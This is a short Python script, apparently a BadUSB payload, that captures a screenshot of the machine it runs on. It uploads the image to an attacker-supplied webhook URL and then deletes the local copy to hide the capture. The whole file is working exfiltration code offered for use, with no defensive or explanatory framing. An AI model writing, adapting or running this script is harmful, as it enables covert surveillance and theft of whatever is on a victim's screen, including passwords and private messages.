import sys
import pyautogui
import requests
import os
import screeninfo

def main(webhook_url):
    screen = screeninfo.get_monitors()[0]
    screen_width, screen_height = screen.width, screen.height

    screenshot = pyautogui.screenshot()
    screenshot.save('badusbscreenshot.png')

    with open('badusbscreenshot.png', 'rb') as file:
        response = requests.post(webhook_url, files={'file': file})

    os.remove('badusbscreenshot.png')

if __name__ == "__main__":
    # Check if a command-line argument is provided
    if len(sys.argv) != 2:
        print("Usage: python screenshot.py <webhook_url>")
        sys.exit(1)

    webhook_url = sys.argv[1]
    main(webhook_url)
